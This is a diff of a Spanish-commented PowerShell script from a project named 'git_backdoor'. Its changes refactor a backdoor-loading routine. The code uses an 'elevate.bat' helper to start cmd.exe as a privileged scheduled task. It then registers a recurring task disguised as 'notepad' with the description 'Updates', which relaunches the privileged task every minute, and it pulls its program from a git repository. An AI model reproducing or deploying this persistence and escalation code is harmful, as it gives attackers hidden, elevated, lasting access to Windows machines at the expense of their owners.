@@ -20,8 +20,14 @@ $program_to_execute = "main.ps1"
 ### Repositorio del que se descargará el archivo a ejecutar
 $git_origin = "https://github.com/elcaza/git_backdoor.git" # Your repository
 
+### Nombre de la tarea con privilegios elevados
+$privileged_task = "privileged_task"
+
 ### Nombre de la tarea programada
-$task_name = "bd_task"
+$recurrent_task = "notepad"
+
+### Programa a ejecutar 
+$task_to_execute = "%windir%\System32\cmd.exe"
 
 # End Configuración
 # ================================================
@@ -122,7 +128,7 @@ function elevate_privileges {
 	"FN: Elevando privilegios git"
 	Set-Location $program_git_location
 	try {
-		Start-Process "elevate.bat" -argumentlist "$task_name %windir%\System32\cmd.exe" -wait
+		Start-Process "elevate.bat" -argumentlist "$privileged_task $task_to_execute" -wait
 	} catch {
 		"FN: error"
 	}
@@ -140,13 +146,13 @@ function load_backdoor {
 
 	# Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"	
 
-	$argument_execute = "schtasks.exe /run /tn 'Apps\$task_name'"
+	$argument_execute = "schtasks.exe /run /tn 'Apps\$privileged_task'"
 
 	$action = New-ScheduledTaskAction -Execute powershell -Argument $argument_execute
 
 	$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)
 
-	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"	
+	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $recurrent_task -Description "Updates"	
 
 }
 
